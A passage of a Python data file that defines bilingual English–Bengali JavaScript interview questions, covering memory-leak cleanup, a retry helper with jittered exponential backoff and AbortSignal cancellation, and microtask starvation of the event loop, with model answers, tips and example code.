            **সমাধান:** প্রতিটি mount-এর সাথে মিলিয়ে cleanup (listener remove, timer clear, unsubscribe, observer `disconnect()`)। `{ signal }` হিসেবে একটা `AbortController` দিলে একসাথে অনেক listener remove হয়। Cache-এর সীমা দাও (LRU/TTL), আর object বা DOM node-কে key ধরে metadata রাখতে `WeakMap` ব্যবহার করো, যাতে key মরে গেলে entry-ও চলে যায়।
        """,
        quick_en=r"""GC is mark-and-sweep: whatever is reachable from roots (globals, the stack, listeners, timers) stays, so a leak is memory still reachable but no longer needed. I compare heap snapshots and follow retainers (usually listeners, intervals or subscriptions), then give every mount a cleanup and bound my caches.""",
        quick_bn=r"""GC mark-and-sweep পদ্ধতিতে কাজ করে: root (global, stack, listener, timer) থেকে যা reach করা যায় তা থেকে যায়, তাই leak মানে এমন memory যা এখনও reachable কিন্তু আর দরকার নেই। Heap snapshot compare করে retainer ধরে আমি কারণ খুঁজি (সাধারণত listener, interval বা subscription), তারপর প্রতিটা mount-এর জন্য cleanup রাখি আর cache-এর size সীমিত করি।""",
        ex_en=r"""
            - **Clarify first:** is it the JS heap, DOM nodes, or something else (images, canvas, WebSocket buffers)? Does it happen for all agents or only with a specific widget? That narrows the search quickly.
            - **Closures retain scopes:** a tiny listener that closes over a component's scope can keep a large array or a whole detached DOM subtree alive.
            - **`WeakRef` / `FinalizationRegistry`** exist (Baseline widely available) but GC timing is non-deterministic. Use them only for optional caches, never for essential cleanup like closing connections.
            - **DevTools pitfall:** logging big objects with `console.log` while DevTools is open keeps them reachable — test leaks with the console cleared.
            - **Frameworks:** in React, effects must return cleanup functions; StrictMode's double-invoke in development helps reveal missing cleanups.
            - **Prevent regressions:** add a memory check to an end-to-end test (repeat a flow N times, compare heap usage), and make cleanup part of the code-review checklist.
        """,
        ex_bn=r"""
            - **আগে পরিষ্কার করে নাও:** এটা কি JS heap, DOM node, নাকি অন্য কিছু (image, canvas, WebSocket buffer)? সব agent-এর হয়, নাকি নির্দিষ্ট একটা widget-এ? এতে দ্রুত খোঁজার পরিধি কমে।
            - **Closure scope ধরে রাখে:** component-এর scope ধরে রাখা ছোট্ট একটা listener বড় একটা array বা পুরো detached DOM subtree-কে বাঁচিয়ে রাখতে পারে।
            - **`WeakRef` / `FinalizationRegistry`** আছে (Baseline widely available), কিন্তু GC কখন চলবে তা নির্ধারিত নয়। এগুলো শুধু optional cache-এর জন্য ব্যবহার করো, connection বন্ধ করার মতো জরুরি cleanup-এর জন্য কখনো নয়।
            - **DevTools-এর ফাঁদ:** DevTools খোলা অবস্থায় `console.log` দিয়ে বড় object log করলে সেগুলো reachable থেকে যায় — leak test করার সময় console clear রাখো।
            - **Framework:** React-এ effect-কে অবশ্যই cleanup function return করতে হবে; development-এ StrictMode-এর double-invoke বাদ পড়া cleanup ধরতে সাহায্য করে।
            - **Regression ঠেকাও:** end-to-end test-এ memory check যোগ করো (একটা flow N বার চালিয়ে heap usage তুলনা করো), আর cleanup-কে code review checklist-এর অংশ করো।
        """,
        tip_en=r"""Structure it as: clarify → reproduce → measure → find retainers → fix → prevent. Naming concrete DevTools steps (snapshot comparison, "Detached" filter, retainers) is what convinces interviewers you've actually done this.""",
        tip_bn=r"""এভাবে সাজাও: clarify → reproduce → measure → retainer খোঁজা → fix → prevent। DevTools-এর নির্দিষ্ট ধাপগুলো (snapshot comparison, "Detached" filter, retainer) বললেই interviewer বিশ্বাস করেন যে তুমি বাস্তবে এটা করেছ।""",
        mist_en=r"""Believing circular references leak in modern engines (they don't with tracing GC), calling "GC" manually as a fix, or using `WeakRef` to "fix" a leak that is really a missing cleanup.""",
        mist_bn=r"""ভাবা যে আধুনিক engine-এ circular reference leak করে (tracing GC-তে করে না), fix হিসেবে হাতে "GC" চালানো, অথবা আসলে cleanup বাদ পড়ায় হওয়া leak-কে `WeakRef` দিয়ে "ঠিক" করা।""",
        code=r"""
            // Leaky: every mount adds work that is never removed
            function mountTicketPanel(el, store) {
              window.addEventListener('resize', () => layout(el));
              setInterval(() => refreshSla(el), 5_000);
              store.subscribe((state) => render(el, state));
            }

            // Fixed: one AbortController + explicit cleanup
            const metaByNode = new WeakMap(); // entries vanish when the node is garbage-collected

            function mountTicketPanel(el, store) {
              const controller = new AbortController();
              const { signal } = controller;

              window.addEventListener('resize', () => layout(el), { signal });
              const timer = setInterval(() => refreshSla(el), 5_000);
              const unsubscribe = store.subscribe((state) => render(el, state));
              metaByNode.set(el, { mountedAt: Date.now() });

              return function unmount() {
                controller.abort(); // removes every listener registered with this signal
                clearInterval(timer);
                unsubscribe();
              };
            }
        """,
        lang="javascript",
        follow=[
            ("Why can a `Map` keyed by DOM nodes leak, while a `WeakMap` cannot?", "DOM node-কে key ধরে রাখা `Map` কেন leak করতে পারে, কিন্তু `WeakMap` পারে না?"),
            ("How would you detect a memory leak in a Node.js server instead?", "Node.js server-এ memory leak কীভাবে খুঁজবে?"),
        ],
        related=["js-004", "js-038", "js-039"],
        refs=[R_MEMORY, R_WEAKMAP, R_WEAKREF],
    ),
    # ------------------------------------------------------------------ js-033
    Q(
        id="js-033", sub="Async Patterns & Cancellation", diff="hard", type="coding",
        prio="high", market="both", mins=12,
        tags=["retry", "exponential-backoff", "jitter", "abortcontroller", "fetch", "resilience"],
        ver="ES2017+ async/await; `AbortSignal.any` (Baseline widely available), `AbortSignal.timeout` (Baseline newly available); Node.js 20+", vs=True, status="stable",
        q_en=r"""
            Write `retry(task, options)` for flaky network calls:

            - exponential backoff **with jitter**, capped at `maxDelay`;
            - at most `retries` extra attempts;
            - a `shouldRetry(err)` predicate (e.g. retry network errors, 5xx and 429, but not 400/401/404);
            - cancellation through an `AbortSignal` that stops both the in-flight attempt and any pending wait.

            `task` receives `{ attempt, signal }` and returns a promise. Show how you'd use it with `fetch` and an overall timeout.
        """,
        q_bn=r"""
            অনির্ভরযোগ্য network call-এর জন্য `retry(task, options)` লেখো:

            - **jitter সহ** exponential backoff, `maxDelay` দিয়ে সীমিত;
            - সর্বোচ্চ `retries` সংখ্যক বাড়তি চেষ্টা;
            - একটা `shouldRetry(err)` predicate (যেমন network error, 5xx আর 429-এ retry, কিন্তু 400/401/404-এ নয়);
            - একটা `AbortSignal` দিয়ে cancellation, যেটা চলমান attempt আর অপেক্ষারত wait — দুটোই থামাবে।

            `task` পায় `{ attempt, signal }` আর একটা promise return করে। `fetch` আর একটা সামগ্রিক timeout দিয়ে এটা কীভাবে ব্যবহার করবে, দেখাও।
        """,
        a_en=r"""
            The core is a loop: try the task; on failure, decide whether to retry, wait, and try again.

            - **Backoff:** the wait cap grows as `baseDelay * 2 ** attempt`, limited by `maxDelay`. I use **full jitter** — a random delay between 0 and the cap — so thousands of clients that failed together don't all retry at the same instant (the "thundering herd").
            - **Decision:** stop when attempts are exhausted or `shouldRetry(err)` says the error is permanent (validation or auth errors won't fix themselves).
            - **Cancellation:** the same `signal` is passed to the task (so `fetch` aborts the request) and to an abortable `sleep` that rejects with `signal.reason` and clears its timer. Before each attempt `signal.throwIfAborted()` stops immediately; after a failure, if the signal is aborted I rethrow the abort reason instead of retrying.
            - **Overall timeout:** combine the caller's signal with `AbortSignal.timeout(ms)` using `AbortSignal.any([...])`.

            Time is O(retries) attempts; extra space is O(1).
        """,
        a_bn=r"""
            মূল অংশটা একটা loop: task চেষ্টা করো; fail করলে ঠিক করো retry করবে কিনা, অপেক্ষা করো, আবার চেষ্টা করো।

            - **Backoff:** অপেক্ষার সর্বোচ্চ সীমা `baseDelay * 2 ** attempt` হারে বাড়ে, `maxDelay` দিয়ে সীমিত। আমি **full jitter** ব্যবহার করি — 0 থেকে সেই সীমার মধ্যে random delay — যাতে একসাথে fail করা হাজারো client একই মুহূর্তে retry না করে ("thundering herd")।
            - **সিদ্ধান্ত:** চেষ্টা শেষ হলে বা `shouldRetry(err)` বললে error স্থায়ী (validation বা auth error নিজে থেকে ঠিক হয় না) — তখন থামো।
            - **Cancellation:** একই `signal` task-কে দেওয়া হয় (যাতে `fetch` request abort করে) আর একটা abortable `sleep`-কেও, যেটা `signal.reason` দিয়ে reject করে এবং নিজের timer clear করে। প্রতিটি attempt-এর আগে `signal.throwIfAborted()` সাথে সাথে থামায়; fail করার পর signal abort হয়ে থাকলে retry না করে abort-এর কারণটাই আবার throw করি।
            - **সামগ্রিক timeout:** caller-এর signal আর `AbortSignal.timeout(ms)`-কে `AbortSignal.any([...])` দিয়ে একসাথে জুড়ে দাও।

            Time O(retries) সংখ্যক attempt; বাড়তি space O(1)।
        """,
        quick_en=r"""In a loop, run the task; on failure, stop if retries are used up or `shouldRetry(err)` is false, else wait a random delay up to `min(maxDelay, baseDelay * 2 ** attempt)` (full jitter). Pass one `AbortSignal` to the task and to an abortable `sleep`, with `AbortSignal.timeout` for an overall limit.""",
        quick_bn=r"""একটা loop-এ task চালাই; fail করলে, retry শেষ হয়ে গেলে বা `shouldRetry(err)` false হলে থেমে যাই, নইলে `min(maxDelay, baseDelay * 2 ** attempt)` পর্যন্ত একটা random delay (full jitter) অপেক্ষা করে আবার চেষ্টা করি। একই `AbortSignal` task আর abortable `sleep` দুটোকেই দিই, আর পুরো কাজের সীমা দিতে `AbortSignal.timeout` যোগ করি।""",
        ex_en=r"""
            - **Idempotency:** only retry operations that are safe to repeat. A retried `POST /payments` can charge twice — use an idempotency key that the server de-duplicates, or don't retry.
            - **Respect the server:** for 429/503, honour a `Retry-After` header when present instead of your own delay.
            - **Clean up:** `sleep` removes its abort listener when the timer fires — without that, a long-lived signal collects one listener per retry (a small leak).
            - **Distinguish abort from failure:** `fetch` rejects with an `AbortError`/`TimeoutError` `DOMException` when aborted; callers usually want to ignore user cancellations but report timeouts.
            - **Bigger picture:** retries add load during an outage. Pair them with a circuit breaker (stop calling a dependency that keeps failing), a total time budget, and logging/metrics per attempt.
            - `AbortSignal.any` is Baseline widely available and `AbortSignal.timeout` is Baseline newly available; both exist in current Node.js LTS.
        """,
        ex_bn=r"""
            - **Idempotency:** শুধু সেই operation retry করো যেটা বারবার করা নিরাপদ। Retry হওয়া `POST /payments` দুইবার টাকা কাটতে পারে — এমন idempotency key ব্যবহার করো যেটা server de-duplicate করে, নয়তো retry কোরো না।
            - **Server-কে সম্মান করো:** 429/503-এ `Retry-After` header থাকলে নিজের delay-এর বদলে সেটা মানো।
            - **Cleanup:** timer fire করলে `sleep` তার abort listener সরিয়ে ফেলে — না সরালে দীর্ঘজীবী signal-এ প্রতি retry-তে একটা করে listener জমবে (ছোট একটা leak)।
            - **Abort আর failure আলাদা করো:** abort হলে `fetch` একটা `AbortError`/`TimeoutError` `DOMException` দিয়ে reject করে; caller সাধারণত user-এর cancel উপেক্ষা করতে চায় কিন্তু timeout report করতে চায়।
            - **বড় ছবি:** outage-এর সময় retry load বাড়ায়। এর সাথে circuit breaker (বারবার fail করা dependency call করা বন্ধ রাখা), একটা মোট time budget, আর প্রতি attempt-এর logging/metrics রাখো।
            - `AbortSignal.any` Baseline widely available আর `AbortSignal.timeout` Baseline newly available; দুটোই বর্তমান Node.js LTS-এ আছে।
        """,
        tip_en=r"""Clarify requirements first (which errors are retryable? is the operation idempotent?). Then code the loop, then add cancellation. Mentioning jitter, `Retry-After` and idempotency keys usually turns this into a strong senior-level answer.""",
        tip_bn=r"""আগে requirement পরিষ্কার করো (কোন error retry করা যাবে? operation কি idempotent?)। তারপর loop লেখো, তারপর cancellation যোগ করো। Jitter, `Retry-After` আর idempotency key-এর কথা বললে সাধারণত এটা শক্তিশালী senior-level উত্তর হয়ে যায়।""",
        mist_en=r"""Retrying every error including 4xx, fixed delays without jitter, a `sleep` that ignores the abort signal (so cancel waits for the full delay), or retrying non-idempotent writes blindly.""",
        mist_bn=r"""4xx সহ সব error-এ retry করা, jitter ছাড়া নির্দিষ্ট delay, abort signal উপেক্ষা করা `sleep` (ফলে cancel করলেও পুরো delay অপেক্ষা করতে হয়), অথবা non-idempotent write অন্ধভাবে retry করা।""",
        code=r"""
            function sleep(ms, signal) {
              return new Promise((resolve, reject) => {
                if (signal?.aborted) {
                  reject(signal.reason);
                  return;
                }
                const onAbort = () => {
                  clearTimeout(timer);
                  reject(signal.reason);
                };
                const timer = setTimeout(() => {
                  signal?.removeEventListener('abort', onAbort);
                  resolve();
                }, ms);
                signal?.addEventListener('abort', onAbort, { once: true });
              });
            }

            async function retry(task, {
              retries = 3,
              baseDelay = 200,
              maxDelay = 5_000,
              signal,
              shouldRetry = () => true,
              onRetry,
            } = {}) {
              for (let attempt = 0; ; attempt++) {
                signal?.throwIfAborted();
                try {
                  return await task({ attempt, signal });
                } catch (err) {
                  if (signal?.aborted) throw signal.reason;
                  if (attempt >= retries || !shouldRetry(err)) throw err;

                  const cap = Math.min(maxDelay, baseDelay * 2 ** attempt);
                  const delay = Math.random() * cap; // full jitter
                  onRetry?.({ attempt: attempt + 1, delay, err });
                  await sleep(delay, signal);
                }
              }
            }

            // Usage with fetch
            class HttpError extends Error {
              constructor(response) {
                super(`HTTP ${response.status}`);
                this.name = 'HttpError';
                this.status = response.status;
              }
            }

            const isRetryable = (err) =>
              !(err instanceof HttpError) || err.status === 429 || err.status >= 500;

            const userCancel = new AbortController(); // e.g. aborted when the user leaves the page
            const signal = AbortSignal.any([userCancel.signal, AbortSignal.timeout(10_000)]);

            const orders = await retry(
              async ({ signal }) => {
                const res = await fetch('/api/orders', { signal });
                if (!res.ok) throw new HttpError(res);
                return res.json();
              },
              { retries: 4, signal, shouldRetry: isRetryable },
            );
        """,
        lang="javascript",
        time="O(retries) attempts", space="O(1)",
        follow=[
            ("How would you add a circuit breaker on top of this?", "এর উপর একটা circuit breaker কীভাবে যোগ করবে?"),
            ("Why is full jitter better than a fixed exponential delay?", "নির্দিষ্ট exponential delay-এর চেয়ে full jitter কেন ভালো?"),
        ],
        related=["js-020", "js-037", "js-019"],
        refs=[R_ABORTCTRL, R_ABORT_ANY, R_ABORT_TIMEOUT],
    ),
    # ------------------------------------------------------------------ js-034
    Q(
        id="js-034", sub="Event Loop, Microtasks & Tasks", diff="hard", type="conceptual",
        prio="high", market="both", mins=10,
        tags=["event-loop", "microtask-starvation", "long-tasks", "performance", "scheduler-yield", "web-workers"],
        ver="HTML event loop; `scheduler.yield()` not Baseline (Chromium 129+, Firefox 142+, no Safari)", vs=True, status="stable",
        q_en=r"""A page freezes while processing a large list, even though the code is "async" and uses promises everywhere. How can microtasks starve the event loop, and how would you restructure the work so the UI stays responsive?""",
        q_bn=r"""একটা বড় list process করার সময় page জমে যায়, যদিও code "async" এবং সব জায়গায় promise ব্যবহার করা হয়েছে। Microtask কীভাবে event loop-কে starve করতে পারে, আর UI responsive রাখতে কাজটা কীভাবে নতুন করে সাজাবে?""",
        a_en=r"""
            "Async" doesn't mean "non-blocking". After every task, the browser drains the **entire** microtask queue before it can render a frame, handle a click or run a timer. If each microtask queues another one — recursive `.then`, `queueMicrotask`, or an `await` loop over values that are already resolved — the queue never empties. The result is identical to a `while (true)` loop: no paint, no input, timers never fire.

            The fix is to split the work into chunks and **yield to the task queue** between them, so the browser gets a chance to render and handle input:
            - Work for a time budget (say 5–10 ms), then yield with `setTimeout(0)`, a `MessageChannel` post, or `scheduler.yield()` where available.
            - `scheduler.yield()` is the best option because the continuation keeps priority over other queued tasks, but it isn't Baseline yet (Chromium 129+ and Firefox 142+, no Safari), so feature-detect and fall back to `setTimeout`.
            - If the work is CPU-heavy (parsing, sorting, image processing), move it to a **Web Worker** so the main thread stays free.
            - Do less work: paginate, virtualise long lists, and process only what's visible.

            In Node.js the same starvation happens with recursive `process.nextTick` or promise loops — they block I/O callbacks. Yield with `setImmediate` or move work to `worker_threads`.
        """,
        a_bn=r"""
            "Async" মানেই "non-blocking" নয়। প্রতিটি task-এর পর browser **পুরো** microtask queue খালি করে, তারপরই frame render, click handle বা timer চালাতে পারে। প্রতিটি microtask যদি আরেকটা microtask queue করে — recursive `.then`, `queueMicrotask`, বা আগেই resolved value-র উপর `await` loop — তাহলে queue কখনো খালি হয় না। ফলাফল একটা `while (true)` loop-এর মতোই: কোনো paint নেই, input নেই, timer কখনো fire করে না।

            সমাধান হলো কাজটা টুকরো টুকরো করা আর মাঝে মাঝে **task queue-কে সুযোগ দেওয়া (yield)**, যাতে browser render আর input handle করার সুযোগ পায়:
            - একটা time budget (ধরো 5–10 ms) ধরে কাজ করো, তারপর `setTimeout(0)`, `MessageChannel` post, বা যেখানে আছে সেখানে `scheduler.yield()` দিয়ে yield করো।
            - `scheduler.yield()` সবচেয়ে ভালো, কারণ continuation অন্য queued task-এর চেয়ে অগ্রাধিকার পায়, কিন্তু এটা এখনো Baseline নয় (Chromium 129+ আর Firefox 142+, Safari-তে নেই), তাই feature-detect করে `setTimeout`-এ fallback দাও।
            - কাজটা CPU-heavy হলে (parsing, sorting, image processing) **Web Worker**-এ সরিয়ে দাও, যাতে main thread মুক্ত থাকে।
            - কাজ কমাও: paginate করো, লম্বা list virtualise করো, শুধু যা দেখা যাচ্ছে তা process করো।

            Node.js-এও recursive `process.nextTick` বা promise loop-এ একই starvation হয় — এগুলো I/O callback আটকে দেয়। `setImmediate` দিয়ে yield করো বা কাজ `worker_threads`-এ সরাও।
        """,
        quick_en=r"""The browser drains the whole microtask queue before it can render, handle input or run timers, so microtasks that keep queuing microtasks block the page like one long synchronous loop. Work in time-boxed chunks and yield to the task queue (`setTimeout`, or `scheduler.yield()` where supported), or use a Web Worker.""",
        quick_bn=r"""Browser render, input handle বা timer চালানোর আগে পুরো microtask queue খালি করে, তাই microtask যদি একের পর এক নতুন microtask যোগ করতে থাকে, page একটা লম্বা synchronous loop-এর মতোই আটকে যায়। কাজকে ছোট time-boxed chunk-এ ভাগ করে মাঝে মাঝে task queue-তে yield করো (`setTimeout`, বা যেখানে support আছে `scheduler.yield()`), অথবা Web Worker ব্যবহার করো।""",
        ex_en=r"""
            - **Why microtasks can't help:** a microtask is just "run this right after the current job". It's meant for short follow-ups (promise reactions), not for scheduling large work. Rendering and input are tasks/steps that only happen once the microtask queue is empty.
            - **Long tasks:** anything blocking the main thread for over 50 ms counts as a long task and hurts Interaction to Next Paint (INP), a Core Web Vital. Aim for chunks well under that.
            - **Measuring:** the DevTools Performance panel shows long tasks as red-flagged blocks; the starving version appears as one giant task made of thousands of tiny microtasks.
            - **Fallback details:** browsers clamp deeply nested `setTimeout` calls to at least 4 ms, so a `MessageChannel`-based yield can be faster for many small chunks. `requestIdleCallback` suits low-priority background work but isn't available in Safari.
            - **Workers:** data is copied with structured clone; for large binary data, transfer `ArrayBuffer`s instead of copying.
        """,
        ex_bn=r"""
            - **Microtask কেন সাহায্য করে না:** microtask মানে শুধু "এই job-এর ঠিক পরে এটা চালাও"। এটা ছোট follow-up-এর (promise reaction) জন্য, বড় কাজ schedule করার জন্য নয়। Rendering আর input হলো task/ধাপ, যেগুলো microtask queue খালি হলেই কেবল ঘটে।
            - **Long task:** main thread 50 ms-এর বেশি আটকে রাখা যেকোনো কাজ long task, আর এটা Interaction to Next Paint (INP)-এর ক্ষতি করে, যেটা একটা Core Web Vital। প্রতিটি টুকরো এর অনেক নিচে রাখার চেষ্টা করো।
            - **মাপা:** DevTools-এর Performance panel long task-কে লাল চিহ্নিত block হিসেবে দেখায়; starve করা version হাজারো ছোট microtask দিয়ে তৈরি একটা বিশাল task হিসেবে দেখা যায়।
            - **Fallback-এর খুঁটিনাটি:** browser অনেক গভীরে nested `setTimeout`-কে কমপক্ষে 4 ms-এ clamp করে, তাই অনেক ছোট টুকরোর ক্ষেত্রে `MessageChannel`-ভিত্তিক yield দ্রুত হতে পারে। কম অগ্রাধিকারের background কাজের জন্য `requestIdleCallback` ভালো, কিন্তু Safari-তে নেই।
            - **Worker:** data structured clone দিয়ে copy হয়; বড় binary data হলে copy না করে `ArrayBuffer` transfer করো।
        """,
        tip_en=r"""Open with the one-liner "async isn't non-blocking — microtasks run before rendering". Then show the starving pattern and the chunked fix, and finish with "and if it's CPU-heavy, a Web Worker". Mentioning INP connects it to business impact.""",
        tip_bn=r"""শুরু করো এক লাইনে: "async মানে non-blocking নয় — microtask rendering-এর আগে চলে"। তারপর starve করা pattern আর টুকরো করা সমাধান দেখাও, আর শেষ করো "CPU-heavy হলে Web Worker" দিয়ে। INP-এর কথা বললে এটা business impact-এর সাথে যুক্ত হয়।""",
        mist_en=r"""Wrapping a heavy loop in `async` or `Promise.resolve().then(...)` and expecting it to run "in the background", or yielding with `await Promise.resolve()` — that's still a microtask and doesn't let the browser render.""",
        mist_bn=r"""ভারী loop-কে `async` বা `Promise.resolve().then(...)`-এ মুড়ে ভাবা যে এটা "background-এ" চলবে, অথবা `await Promise.resolve()` দিয়ে yield করা — এটাও microtask, browser-কে render করার সুযোগ দেয় না।""",
        code=r"""
            // Starves the event loop: each step queues another microtask
            function processAll(items) {
              if (items.length === 0) return;
              heavyWork(items.shift());
              Promise.resolve().then(() => processAll(items)); // no paint, no clicks, no timers
            }

            // Responsive: work in time-boxed chunks, yield to the task queue between them
            const yieldToMain = () =>
              globalThis.scheduler?.yield
                ? globalThis.scheduler.yield()                       // Chromium 129+, Firefox 142+
                : new Promise((resolve) => setTimeout(resolve, 0)); // fallback everywhere

            async function processInChunks(items, handle, budgetMs = 8) {
              let deadline = performance.now() + budgetMs;
              for (const item of items) {
                handle(item);
                if (performance.now() >= deadline) {
                  await yieldToMain(); // browser can render and handle input here
                  deadline = performance.now() + budgetMs;
                }
              }
            }
        """,
        lang="javascript",
        follow=[
            ("Why does `await Promise.resolve()` not give the browser a chance to paint?", "`await Promise.resolve()` কেন browser-কে paint করার সুযোগ দেয় না?"),
            ("When would you choose a Web Worker over chunking?", "কখন chunking-এর বদলে Web Worker বেছে নেবে?"),
        ],
        related=["js-016", "js-029", "js-039"],
        refs=[R_MICROTASK, R_LONG_TASKS, R_EXEC_MODEL],
    ),
]

if __name__ == "__main__":
    save("javascript", "b5", QUESTIONS)
